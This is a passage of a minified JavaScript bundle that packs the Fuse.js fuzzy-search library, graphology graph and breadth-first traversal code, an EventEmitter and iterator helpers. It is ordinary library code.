n=1;n<arguments.length;n++){var r=null!=arguments[n]?arguments[n]:{};n%2?t(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):t(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function n(t){return n="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},n(t)}function r(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function i(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}function o(t,e,n){return e&&i(t.prototype,e),n&&i(t,n),Object.defineProperty(t,"prototype",{writable:!1}),t}function a(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function u(t){return function(t){if(Array.isArray(t))return c(t)}(t)||function(t){if("undefined"!=typeof Symbol&&null!=t[Symbol.iterator]||null!=t["@@iterator"])return Array.from(t)}(t)||function(t,e){if(t){if("string"==typeof t)return c(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);return"Object"===n&&t.constructor&&(n=t.constructor.name),"Map"===n||"Set"===n?Array.from(t):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?c(t,e):void 0}}(t)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function c(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}function s(t){return Array.isArray?Array.isArray(t):"[object Array]"===m(t)}var h=1/0;function f(t){return null==t?"":function(t){if("string"==typeof t)return t;var e=t+"";return"0"==e&&1/t==-h?"-0":e}(t)}function l(t){return"string"==typeof t}function d(t){return"number"==typeof t}function p(t){return!0===t||!1===t||function(t){return y(t)&&null!==t}(t)&&"[object Boolean]"==m(t)}function y(t){return"object"===n(t)}function g(t){return null!=t}function v(t){return!t.trim().length}function m(t){return null==t?void 0===t?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}var _=function(t){return"Missing ".concat(t," property in key")},b=function(t){return"Property 'weight' in key '".concat(t,"' must be a positive integer")},w=Object.prototype.hasOwnProperty,x=function(){function t(e){var n=this;r(this,t),this._keys=[],this._keyMap={};var i=0;e.forEach((function(t){var e=k(t);i+=e.weight,n._keys.push(e),n._keyMap[e.id]=e,i+=e.weight})),this._keys.forEach((function(t){t.weight/=i}))}return o(t,[{key:"get",value:function(t){return this._keyMap[t]}},{key:"keys",value:function(){return this._keys}},{key:"toJSON",value:function(){return JSON.stringify(this._keys)}}]),t}();function k(t){var e=null,n=null,r=null,i=1,o=null;if(l(t)||s(t))r=t,e=M(t),n=E(t);else{if(!w.call(t,"name"))throw new Error(_("name"));var a=t.name;if(r=a,w.call(t,"weight")&&(i=t.weight)<=0)throw new Error(b(a));e=M(a),n=E(a),o=t.getFn}return{path:e,id:n,weight:i,src:r,getFn:o}}function M(t){return s(t)?t:t.split(".")}function E(t){return s(t)?t.join("."):t}var A={useExtendedSearch:!1,getFn:function(t,e){var n=[],r=!1;return function t(e,i,o){if(g(e))if(i[o]){var a=e[i[o]];if(!g(a))return;if(o===i.length-1&&(l(a)||d(a)||p(a)))n.push(f(a));else if(s(a)){r=!0;for(var u=0,c=a.length;u<c;u+=1)t(a[u],i,o+1)}else i.length&&t(a,i,o+1)}else n.push(e)}(t,l(e)?e.split("."):e,0),r?n:n[0]},ignoreLocation:!1,ignoreFieldNorm:!1,fieldNormWeight:1},S=e(e(e(e({},{isCaseSensitive:!1,includeScore:!1,keys:[],shouldSort:!0,sortFn:function(t,e){return t.score===e.score?t.idx<e.idx?-1:1:t.score<e.score?-1:1}}),{includeMatches:!1,findAllMatches:!1,minMatchCharLength:1}),{location:0,threshold:.6,distance:100}),A),L=/[^ ]+/g;var N=function(){function t(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},n=e.getFn,i=void 0===n?S.getFn:n,o=e.fieldNormWeight,a=void 0===o?S.fieldNormWeight:o;r(this,t),this.norm=function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:1,e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:3,n=new Map,r=Math.pow(10,e);return{get:function(e){var i=e.match(L).length;if(n.has(i))return n.get(i);var o=1/Math.pow(i,.5*t),a=parseFloat(Math.round(o*r)/r);return n.set(i,a),a},clear:function(){n.clear()}}}(a,3),this.getFn=i,this.isCreated=!1,this.setIndexRecords()}return o(t,[{key:"setSources",value:function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[];this.docs=t}},{key:"setIndexRecords",value:function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[];this.records=t}},{key:"setKeys",value:function(){var t=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[];this.keys=e,this._keysMap={},e.forEach((function(e,n){t._keysMap[e.id]=n}))}},{key:"create",value:function(){var t=this;!this.isCreated&&this.docs.length&&(this.isCreated=!0,l(this.docs[0])?this.docs.forEach((function(e,n){t._addString(e,n)})):this.docs.forEach((function(e,n){t._addObject(e,n)})),this.norm.clear())}},{key:"add",value:function(t){var e=this.size();l(t)?this._addString(t,e):this._addObject(t,e)}},{key:"removeAt",value:function(t){this.records.splice(t,1);for(var e=t,n=this.size();e<n;e+=1)this.records[e].i-=1}},{key:"getValueForItemAtKeyId",value:function(t,e){return t[this._keysMap[e]]}},{key:"size",value:function(){return this.records.length}},{key:"_addString",value:function(t,e){if(g(t)&&!v(t)){var n={v:t,i:e,n:this.norm.get(t)};this.records.push(n)}}},{key:"_addObject",value:function(t,e){var n=this,r={i:e,$:{}};this.keys.forEach((function(e,i){var o=e.getFn?e.getFn(t):n.getFn(t,e.path);if(g(o))if(s(o))!function(){for(var t=[],e=[{nestedArrIndex:-1,value:o}];e.length;){var a=e.pop(),u=a.nestedArrIndex,c=a.value;if(g(c))if(l(c)&&!v(c)){var h={v:c,i:u,n:n.norm.get(c)};t.push(h)}else s(c)&&c.forEach((function(t,n){e.push({nestedArrIndex:n,value:t})}))}r.$[i]=t}();else if(l(o)&&!v(o)){var a={v:o,n:n.norm.get(o)};r.$[i]=a}})),this.records.push(r)}},{key:"toJSON",value:function(){return{keys:this.keys,records:this.records}}}]),t}();function C(t,e){var n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},r=n.getFn,i=void 0===r?S.getFn:r,o=n.fieldNormWeight,a=void 0===o?S.fieldNormWeight:o,u=new N({getFn:i,fieldNormWeight:a});return u.setKeys(t.map(k)),u.setSources(e),u.create(),u}function T(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=e.errors,r=void 0===n?0:n,i=e.currentLocation,o=void 0===i?0:i,a=e.expectedLocation,u=void 0===a?0:a,c=e.distance,s=void 0===c?S.distance:c,h=e.ignoreLocation,f=void 0===h?S.ignoreLocation:h,l=r/t.length;if(f)return l;var d=Math.abs(u-o);return s?l+d/s:d?1:l}var G=32;function U(t,e,n){var r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{},i=r.location,o=void 0===i?S.location:i,a=r.distance,u=void 0===a?S.distance:a,c=r.threshold,s=void 0===c?S.threshold:c,h=r.findAllMatches,f=void 0===h?S.findAllMatches:h,l=r.minMatchCharLength,d=void 0===l?S.minMatchCharLength:l,p=r.includeMatches,y=void 0===p?S.includeMatches:p,g=r.ignoreLocation,v=void 0===g?S.ignoreLocation:g;if(e.length>G)throw new Error("Pattern length exceeds max of ".concat(G,"."));for(var m,_=e.length,b=t.length,w=Math.max(0,Math.min(o,b)),x=s,k=w,M=d>1||y,E=M?Array(b):[];(m=t.indexOf(e,k))>-1;){var A=T(e,{currentLocation:m,expectedLocation:w,distance:u,ignoreLocation:v});if(x=Math.min(A,x),k=m+_,M)for(var L=0;L<_;)E[m+L]=1,L+=1}k=-1;for(var N=[],C=1,U=_+b,D=1<<_-1,O=0;O<_;O+=1){for(var j=0,z=U;j<z;)T(e,{errors:O,currentLocation:w+z,expectedLocation:w,distance:u,ignoreLocation:v})<=x?j=z:U=z,z=Math.floor((U-j)/2+j);U=z;var P=Math.max(1,w-z+1),I=f?b:Math.min(w+z,b)+_,R=Array(I+2);R[I+1]=(1<<O)-1;for(var F=I;F>=P;F-=1){var q=F-1,B=n[t.charAt(q)];if(M&&(E[q]=+!!B),R[F]=(R[F+1]<<1|1)&B,O&&(R[F]|=(N[F+1]|N[F])<<1|1|N[F+1]),R[F]&D&&(C=T(e,{errors:O,currentLocation:q,expectedLocation:w,distance:u,ignoreLocation:v}))<=x){if(x=C,(k=q)<=w)break;P=Math.max(1,2*w-k)}}if(T(e,{errors:O+1,currentLocation:w,expectedLocation:w,distance:u,ignoreLocation:v})>x)break;N=R}var Y={isMatch:k>=0,score:Math.max(.001,C)};if(M){var W=function(){for(var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[],e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:S.minMatchCharLength,n=[],r=-1,i=-1,o=0,a=t.length;o<a;o+=1){var u=t[o];u&&-1===r?r=o:u||-1===r||((i=o-1)-r+1>=e&&n.push([r,i]),r=-1)}return t[o-1]&&o-r>=e&&n.push([r,o-1]),n}(E,d);W.length?y&&(Y.indices=W):Y.isMatch=!1}return Y}function D(t){for(var e={},n=0,r=t.length;n<r;n+=1){var i=t.charAt(n);e[i]=(e[i]||0)|1<<r-n-1}return e}var O=function(){function t(e){var n=this,i=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},o=i.location,a=void 0===o?S.location:o,u=i.threshold,c=void 0===u?S.threshold:u,s=i.distance,h=void 0===s?S.distance:s,f=i.includeMatches,l=void 0===f?S.includeMatches:f,d=i.findAllMatches,p=void 0===d?S.findAllMatches:d,y=i.minMatchCharLength,g=void 0===y?S.minMatchCharLength:y,v=i.isCaseSensitive,m=void 0===v?S.isCaseSensitive:v,_=i.ignoreLocation,b=void 0===_?S.ignoreLocation:_;if(r(this,t),this.options={location:a,threshold:c,distance:h,includeMatches:l,findAllMatches:p,minMatchCharLength:g,isCaseSensitive:m,ignoreLocation:b},this.pattern=m?e:e.toLowerCase(),this.chunks=[],this.pattern.length){var w=function(t,e){n.chunks.push({pattern:t,alphabet:D(t),startIndex:e})},x=this.pattern.length;if(x>G){for(var k=0,M=x%G,E=x-M;k<E;)w(this.pattern.substr(k,G),k),k+=G;if(M){var A=x-G;w(this.pattern.substr(A),A)}}else w(this.pattern,0)}}return o(t,[{key:"searchIn",value:function(t){var e=this.options,n=e.isCaseSensitive,r=e.includeMatches;if(n||(t=t.toLowerCase()),this.pattern===t){var i={isMatch:!0,score:0};return r&&(i.indices=[[0,t.length-1]]),i}var o=this.options,a=o.location,c=o.distance,s=o.threshold,h=o.findAllMatches,f=o.minMatchCharLength,l=o.ignoreLocation,d=[],p=0,y=!1;this.chunks.forEach((function(e){var n=e.pattern,i=e.alphabet,o=e.startIndex,g=U(t,n,i,{location:a+o,distance:c,threshold:s,findAllMatches:h,minMatchCharLength:f,includeMatches:r,ignoreLocation:l}),v=g.isMatch,m=g.score,_=g.indices;v&&(y=!0),p+=m,v&&_&&(d=[].concat(u(d),u(_)))}));var g={isMatch:y,score:y?p/this.chunks.length:1};return y&&r&&(g.indices=d),g}}]),t}(),j=[];function z(t,e){for(var n=0,r=j.length;n<r;n+=1){var i=j[n];if(i.condition(t,e))return new i(t,e)}return new O(t,e)}var P="$and",I="$or",R="$path",F="$val",q=function(t){return!(!t[P]&&!t[I])},B=function(t){return a({},P,Object.keys(t).map((function(e){return a({},e,t[e])})))};function Y(t,e){var n=t.matches;e.matches=[],g(n)&&n.forEach((function(t){if(g(t.indices)&&t.indices.length){var n={indices:t.indices,value:t.value};t.key&&(n.key=t.key.src),t.idx>-1&&(n.refIndex=t.idx),e.matches.push(n)}}))}function W(t,e){e.score=t.score}var K=function(){function t(n){var i=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},o=arguments.length>2?arguments[2]:void 0;if(r(this,t),this.options=e(e({},S),i),this.options.useExtendedSearch)throw new Error("Extended search is not available");this._keyStore=new x(this.options.keys),this.setCollection(n,o)}return o(t,[{key:"setCollection",value:function(t,e){if(this._docs=t,e&&!(e instanceof N))throw new Error("Incorrect 'index' type");this._myIndex=e||C(this.options.keys,this._docs,{getFn:this.options.getFn,fieldNormWeight:this.options.fieldNormWeight})}},{key:"add",value:function(t){g(t)&&(this._docs.push(t),this._myIndex.add(t))}},{key:"remove",value:function(){for(var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:function(){return!1},e=[],n=0,r=this._docs.length;n<r;n+=1){var i=this._docs[n];t(i,n)&&(this.removeAt(n),n-=1,r-=1,e.push(i))}return e}},{key:"removeAt",value:function(t){this._docs.splice(t,1),this._myIndex.removeAt(t)}},{key:"getIndex",value:function(){return this._myIndex}},{key:"search",value:function(t){var e=(arguments.length>1&&void 0!==arguments[1]?arguments[1]:{}).limit,n=void 0===e?-1:e,r=this.options,i=r.includeMatches,o=r.includeScore,a=r.shouldSort,u=r.sortFn,c=r.ignoreFieldNorm,s=l(t)?l(this._docs[0])?this._searchStringList(t):this._searchObjectList(t):this._searchLogical(t);return function(t,e){var n=e.ignoreFieldNorm,r=void 0===n?S.ignoreFieldNorm:n;t.forEach((function(t){var e=1;t.matches.forEach((function(t){var n=t.key,i=t.norm,o=t.score,a=n?n.weight:null;e*=Math.pow(0===o&&a?Number.EPSILON:o,(a||1)*(r?1:i))})),t.score=e}))}(s,{ignoreFieldNorm:c}),a&&s.sort(u),d(n)&&n>-1&&(s=s.slice(0,n)),function(t,e){var n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},r=n.includeMatches,i=void 0===r?S.includeMatches:r,o=n.includeScore,a=void 0===o?S.includeScore:o,u=[];return i&&u.push(Y),a&&u.push(W),t.map((function(t){var n=t.idx,r={item:e[n],refIndex:n};return u.length&&u.forEach((function(e){e(t,r)})),r}))}(s,this._docs,{includeMatches:i,includeScore:o})}},{key:"_searchStringList",value:function(t){var e=z(t,this.options),n=this._myIndex.records,r=[];return n.forEach((function(t){var n=t.v,i=t.i,o=t.n;if(g(n)){var a=e.searchIn(n),u=a.isMatch,c=a.score,s=a.indices;u&&r.push({item:n,idx:i,matches:[{score:c,value:n,norm:o,indices:s}]})}})),r}},{key:"_searchLogical",value:function(t){throw new Error("Logical search is not available")}},{key:"_searchObjectList",value:function(t){var e=this,n=z(t,this.options),r=this._myIndex,i=r.keys,o=r.records,a=[];return o.forEach((function(t){var r=t.$,o=t.i;if(g(r)){var c=[];i.forEach((function(t,i){c.push.apply(c,u(e._findMatches({key:t,value:r[i],searcher:n})))})),c.length&&a.push({idx:o,item:r,matches:c})}})),a}},{key:"_findMatches",value:function(t){var e=t.key,n=t.value,r=t.searcher;if(!g(n))return[];var i=[];if(s(n))n.forEach((function(t){var n=t.v,o=t.i,a=t.n;if(g(n)){var u=r.searchIn(n),c=u.isMatch,s=u.score,h=u.indices;c&&i.push({score:s,key:e,value:n,idx:o,norm:a,indices:h})}}));else{var o=n.v,a=n.n,u=r.searchIn(o),c=u.isMatch,h=u.score,f=u.indices;c&&i.push({score:h,key:e,value:o,norm:a,indices:f})}return i}}]),t}();return K.version="6.6.2",K.createIndex=C,K.parseIndex=function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=e.getFn,r=void 0===n?S.getFn:n,i=e.fieldNormWeight,o=void 0===i?S.fieldNormWeight:i,a=t.keys,u=t.records,c=new N({getFn:r,fieldNormWeight:o});return c.setKeys(a),c.setIndexRecords(u),c},K.config=S,K.parseQuery=function(t,e){var n=(arguments.length>2&&void 0!==arguments[2]?arguments[2]:{}).auto,r=void 0===n||n;return q(t)||(t=B(t)),function t(n){var i=Object.keys(n),o=function(t){return!!t[R]}(n);if(!o&&i.length>1&&!q(n))return t(B(n));if(function(t){return!s(t)&&y(t)&&!q(t)}(n)){var a=o?n[R]:i[0],u=o?n[F]:n[a];if(!l(u))throw new Error(function(t){return"Invalid value for key ".concat(t)}(a));var c={keyId:E(a),pattern:u};return r&&(c.searcher=z(u,e)),c}var h={children:[],operator:i[0]};return i.forEach((function(e){var r=n[e];s(r)&&r.forEach((function(e){h.children.push(t(e))}))})),h}(t)},K}()},12:(t,e,n)=>{var r=n(453);function i(t){this.graph=t,this.queue=new r(Array,t.order),this.seen=new Set,this.size=0}i.prototype.hasAlreadySeenEverything=function(){return this.seen.size===this.graph.order},i.prototype.countUnseenNodes=function(){return this.graph.order-this.seen.size},i.prototype.forEachNodeYetUnseen=function(t){var e=this.seen,n=this.graph;n.someNode((function(r,i){return e.size===n.order||!e.has(r)&&!!t(r,i)}))},i.prototype.has=function(t){return this.seen.has(t)},i.prototype.push=function(t){var e=this.seen.size;return this.seen.add(t),e!==this.seen.size&&(this.queue.push(t),this.size++,!0)},i.prototype.pushWith=function(t,e){var n=this.seen.size;return this.seen.add(t),n!==this.seen.size&&(this.queue.push(e),this.size++,!0)},i.prototype.shift=function(){var t=this.queue.shift();return this.size=this.queue.size,t},t.exports=i},181:(t,e,n)=>{var r=n(186),i=n(12),o=n(480),a=o.TraversalRecord,u=o.capitalize;e.a=function(t,e,n,o){if(o=o||{},!r(t))throw new Error("graphology-traversal/bfs: expecting a graphology instance.");if("function"!=typeof n)throw new Error("graphology-traversal/bfs: given callback is not a function.");if(0!==t.order){var c,s=new i(t),h=t["forEach"+u(o.mode||"outbound")+"Neighbor"].bind(t);(null===e?s.forEachNodeYetUnseen.bind(s):function(n){n(e=""+e,t.getNodeAttributes(e))})((function(t,e){for(s.pushWith(t,new a(t,e,0));0!==s.size;)c=s.shift(),!0!==n(c.node,c.attributes,c.depth)&&h(c.node,f)}))}function f(t,e){s.pushWith(t,new a(t,e,c.depth+1))}}},480:(t,e)=>{e.TraversalRecord=function(t,e,n){this.node=t,this.attributes=e,this.depth=n},e.capitalize=function(t){return t[0].toUpperCase()+t.slice(1)}},186:t=>{t.exports=function(t){return null!==t&&"object"==typeof t&&"function"==typeof t.addUndirectedEdgeWithKey&&"function"==typeof t.dropNode&&"boolean"==typeof t.multi}},698:function(t){t.exports=function(){"use strict";function t(e){return(t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t})(e)}function e(t,e){t.prototype=Object.create(e.prototype),t.prototype.constructor=t,r(t,e)}function n(t){return n=Object.setPrototypeOf?Object.getPrototypeOf.bind():function(t){return t.__proto__||Object.getPrototypeOf(t)},n(t)}function r(t,e){return r=Object.setPrototypeOf?Object.setPrototypeOf.bind():function(t,e){return t.__proto__=e,t},r(t,e)}function i(t,e,n){return i=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}()?Reflect.construct.bind():function(t,e,n){var i=[null];i.push.apply(i,e);var o=new(Function.bind.apply(t,i));return n&&r(o,n.prototype),o},i.apply(null,arguments)}function o(t){var e="function"==typeof Map?new Map:void 0;return o=function(t){if(null===t||(o=t,-1===Function.toString.call(o).indexOf("[native code]")))return t;var o;if("function"!=typeof t)throw new TypeError("Super expression must either be null or a function");if(void 0!==e){if(e.has(t))return e.get(t);e.set(t,a)}function a(){return i(t,arguments,n(this).constructor)}return a.prototype=Object.create(t.prototype,{constructor:{value:a,enumerable:!1,writable:!0,configurable:!0}}),r(a,t)},o(t)}function a(t){if(void 0===t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return t}var u=function(){for(var t=arguments[0],e=1,n=arguments.length;e<n;e++)if(arguments[e])for(var r in arguments[e])t[r]=arguments[e][r];return t};function c(t,e,n,r){var i=t._nodes.get(e),o=null;return i?o="mixed"===r?i.out&&i.out[n]||i.undirected&&i.undirected[n]:"directed"===r?i.out&&i.out[n]:i.undirected&&i.undirected[n]:o}function s(e){return"object"===t(e)&&null!==e}function h(t){var e;for(e in t)return!1;return!0}function f(t,e,n){Object.defineProperty(t,e,{enumerable:!1,configurable:!1,writable:!0,value:n})}function l(t,e,n){var r={enumerable:!0,configurable:!0};"function"==typeof n?r.get=n:(r.value=n,r.writable=!1),Object.defineProperty(t,e,r)}function d(t){return!(!s(t)||t.attributes&&!Array.isArray(t.attributes))}"function"==typeof Object.assign&&(u=Object.assign);var p,y={exports:{}},g="object"==typeof Reflect?Reflect:null,v=g&&"function"==typeof g.apply?g.apply:function(t,e,n){return Function.prototype.apply.call(t,e,n)};p=g&&"function"==typeof g.ownKeys?g.ownKeys:Object.getOwnPropertySymbols?function(t){return Object.getOwnPropertyNames(t).concat(Object.getOwnPropertySymbols(t))}:function(t){return Object.getOwnPropertyNames(t)};var m=Number.isNaN||function(t){return t!=t};function _(){_.init.call(this)}y.exports=_,y.exports.once=function(t,e){return new Promise((function(n,r){function i(n){t.removeListener(e,o),r(n)}function o(){"function"==typeof t.removeListener&&t.removeListener("error",i),n([].slice.call(arguments))}N(t,e,o,{once:!0}),"error"!==e&&function(t,e,n){"function"==typeof t.on&&N(t,"error",e,{once:!0})}(t,i)}))},_.EventEmitter=_,_.prototype._events=void 0,_.prototype._eventsCount=0,_.prototype._maxListeners=void 0;var b=10;function w(t){if("function"!=typeof t)throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof t)}function x(t){return void 0===t._maxListeners?_.defaultMaxListeners:t._maxListeners}function k(t,e,n,r){var i,o,a,u;if(w(n),void 0===(o=t._events)?(o=t._events=Object.create(null),t._eventsCount=0):(void 0!==o.newListener&&(t.emit("newListener",e,n.listener?n.listener:n),o=t._events),a=o[e]),void 0===a)a=o[e]=n,++t._eventsCount;else if("function"==typeof a?a=o[e]=r?[n,a]:[a,n]:r?a.unshift(n):a.push(n),(i=x(t))>0&&a.length>i&&!a.warned){a.warned=!0;var c=new Error("Possible EventEmitter memory leak detected. "+a.length+" "+String(e)+" listeners added. Use emitter.setMaxListeners() to increase limit");c.name="MaxListenersExceededWarning",c.emitter=t,c.type=e,c.count=a.length,u=c,console&&console.warn&&console.warn(u)}return t}function M(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,0===arguments.length?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function E(t,e,n){var r={fired:!1,wrapFn:void 0,target:t,type:e,listener:n},i=M.bind(r);return i.listener=n,r.wrapFn=i,i}function A(t,e,n){var r=t._events;if(void 0===r)return[];var i=r[e];return void 0===i?[]:"function"==typeof i?n?[i.listener||i]:[i]:n?function(t){for(var e=new Array(t.length),n=0;n<e.length;++n)e[n]=t[n].listener||t[n];return e}(i):L(i,i.length)}function S(t){var e=this._events;if(void 0!==e){var n=e[t];if("function"==typeof n)return 1;if(void 0!==n)return n.length}return 0}function L(t,e){for(var n=new Array(e),r=0;r<e;++r)n[r]=t[r];return n}function N(t,e,n,r){if("function"==typeof t.on)r.once?t.once(e,n):t.on(e,n);else{if("function"!=typeof t.addEventListener)throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof t);t.addEventListener(e,(function i(o){r.once&&t.removeEventListener(e,i),n(o)}))}}function C(t){if("function"!=typeof t)throw new Error("obliterator/iterator: expecting a function!");this.next=t}Object.defineProperty(_,"defaultMaxListeners",{enumerable:!0,get:function(){return b},set:function(t){if("number"!=typeof t||t<0||m(t))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+t+".");b=t}}),_.init=function(){void 0!==this._events&&this._events!==Object.getPrototypeOf(this)._events||(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},_.prototype.setMaxListeners=function(t){if("number"!=typeof t||t<0||m(t))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+t+".");return this._maxListeners=t,this},_.prototype.getMaxListeners=function(){return x(this)},_.prototype.emit=function(t){for(var e=[],n=1;n<arguments.length;n++)e.push(arguments[n]);var r="error"===t,i=this._events;if(void 0!==i)r=r&&void 0===i.error;else if(!r)return!1;if(r){var o;if(e.length>0&&(o=e[0]),o instanceof Error)throw o;var a=new Error("Unhandled error."+(o?" ("+o.message+")":""));throw a.context=o,a}var u=i[t];if(void 0===u)return!1;if("function"==typeof u)v(u,this,e);else{var c=u.length,s=L(u,c);for(n=0;n<c;++n)v(s[n],this,e)}return!0},_.prototype.addListener=function(t,e){return k(this,t,e,!1)},_.prototype.on=_.prototype.addListener,_.prototype.prependListener=function(t,e){return k(this,t,e,!0)},_.prototype.once=function(t,e){return w(e),this.on(t,E(this,t,e)),this},_.prototype.prependOnceListener=function(t,e){return w(e),this.prependListener(t,E(this,t,e)),this},_.prototype.removeListener=function(t,e){var n,r,i,o,a;if(w(e),void 0===(r=this._events))return this;if(void 0===(n=r[t]))return this;if(n===e||n.listener===e)0==--this._eventsCount?this._events=Object.create(null):(delete r[t],r.removeListener&&this.emit("removeListener",t,n.listener||e));else if("function"!=typeof n){for(i=-1,o=n.length-1;o>=0;o--)if(n[o]===e||n[o].listener===e){a=n[o].listener,i=o;break}if(i<0)return this;0===i?n.shift():function(t,e){for(;e+1<t.length;e++)t[e]=t[e+1];t.pop()}(n,i),1===n.length&&(r[t]=n[0]),void 0!==r.removeListener&&this.emit("removeListener",t,a||e)}return this},_.prototype.off=_.prototype.removeListener,_.prototype.removeAllListeners=function(t){var e,n,r;if(void 0===(n=this._events))return this;if(void 0===n.removeListener)return 0===arguments.length?(this._events=Object.create(null),this._eventsCount=0):void 0!==n[t]&&(0==--this._eventsCount?this._events=Object.create(null):delete n[t]),this;if(0===arguments.length){var i,o=Object.keys(n);for(r=0;r<o.length;++r)"removeListener"!==(i=o[r])&&this.removeAllListeners(i);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if("function"==typeof(e=n[t]))this.removeListener(t,e);else if(void 0!==e)for(r=e.length-1;r>=0;r--)this.removeListener(t,e[r]);return this},_.prototype.listeners=function(t){return A(this,t,!0)},_.prototype.rawListeners=function(t){return A(this,t,!1)},_.listenerCount=function(t,e){return"function"==typeof t.listenerCount?t.listenerCount(e):S.call(t,e)},_.prototype.listenerCount=S,_.prototype.eventNames=function(){return this._eventsCount>0?p(this._events):[]},"undefined"!=typeof Symbol&&(C.prototype[Symbol.iterator]=function(){return this}),C.of=function(){var t=arguments,e=t.length,n=0;return new C((function(){return n>=e?{done:!0}:{done:!1,value:t[n++]}}))},C.empty=function(){return new C((function(){return{done:!0}}))},C.fromSequence=function(t){var e=0,n=t.length;return new C((function(){return e>=n?{done:!0}:{done:!1,value:t[e++]}}))},C.is=function(t){return t instanceof C||"object"==typeof t&&null!==t&&"function"==typeof t.next};var T=C,G={};G.ARRAY_BUFFER_SUPPORT="undefined"!=typeof ArrayBuffer,G.SYMBOL_SUPPORT="undefined"!=typeof Symbol;var U=T,D=G,O=D.ARRAY_BUFFER_SUPPORT,j=D.SYMBOL_SUPPORT,z=function(t){var e=function(t){return"string"==typeof t||Array.isArray(t)||O&&ArrayBuffer.isView(t)?U.fromSequence(t):"object"!=typeof t||null===t?null:j&&"function"==typeof t[Symbol.iterator]?t[Symbol.iterator]():"function"==typeof t.next?t:null}(t);if(!e)throw new Error("obliterator: target is not iterable nor a valid iterator.");return e},P=z,I=function(t,e){for(var n,r=arguments.length>1?e:1/0,i=r!==1/0?new Array(r):[],o=0,a=P(t);;){if(o===r)return i;if((n=a.next()).done)return o!==e&&(i.length=o),i;i[o++]=n.value}},R=function(t){function n(e){var n;return(n=t.call(this)||this).name="GraphError",n.message=e,n}return e(n,t),n}(o(Error)),F=function(t){function n(e){var r;return(r=t.call(this,e)||this).name="InvalidArgumentsGraphError","function"==typeof Error.captureStackTrace&&Error.captureStackTrace(a(r),n.prototype.constructor),r}return e(n,t),n}(R),q=function(t){function n(e){var r;return(r=t.call(this,e)||this).name="NotFoundGraphError","function"==typeof Error.captureStackTrace&&Error.captureStackTrace(a(r),n.prototype.constructor),r}return e(n,t),n}(R),B=function(t){function n(e){var r;return(r=t.call(this,e)||this).name="UsageGraphError","function"==typeof Error.captureStackTrace&&Error.captureStackTrace(a(r),n.prototype.constructor),r}return e(n,t),n}(R);function Y(t,e){this.key=t,this.attributes=e,this.clear()}function W(t,e){this.key=t,this.attributes=e,this.clear()}function K(t,e){this.key=t,this.attributes=e,this.clear()}function H(t,e,n,r,i){this.key=e,this.attributes=i,this.undirected=t,this.source=n,this.target=r}function X(t,e,n,r,i,o,a){var u,c,s,h;if(r=""+r,0===n){if(!(u=t._nodes.get(r)))throw new q("Graph.".concat(e,': could not find the "').concat(r,'" node in the graph.'));s=i,h=o}else if(3===n){if(i=""+i,!(c=t._edges.get(i)))throw new q("Graph.".concat(e,': could not find the "').concat(i,'" edge in the graph.'));var f=c.source.key,l=c.target.key;if(r===f)u=c.target;else{if(r!==l)throw new q("Graph.".concat(e,': the "').concat(r,'" node is not attached to the "').concat(i,'" edge (').concat(f,", ").concat(l,")."));u=c.source}s=o,h=a}else{if(!(c=t._edges.get(r)))throw new q("Graph.".concat(e,': could not find the "').concat(r,'" edge in the 